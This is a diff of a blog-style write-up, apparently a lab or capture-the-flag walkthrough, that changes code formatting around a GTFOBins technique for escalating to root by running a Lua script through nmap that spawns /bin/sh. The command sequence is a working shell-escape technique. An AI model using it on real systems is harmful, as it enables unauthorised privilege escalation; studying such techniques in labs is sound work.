@@ -206,11 +206,11 @@ This is our shot at privilege escalation to `root` because of known techniques
 
 I came across [this webpage](https://gtfobins.github.io/gtfobins/nmap/) which details how to achieve a shell using `nmap`. The code to achieve this is as follows:
 
-```
+{% highlight bash %}
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
 nmap --script=$TF
-```
+{% endhighlight %}
 
 ![Screen Shot 2019-05-30 at 11.52.04 AM.png](/assets/images/screen-shot-2019-05-30-at-11.52.04-am.png)
 
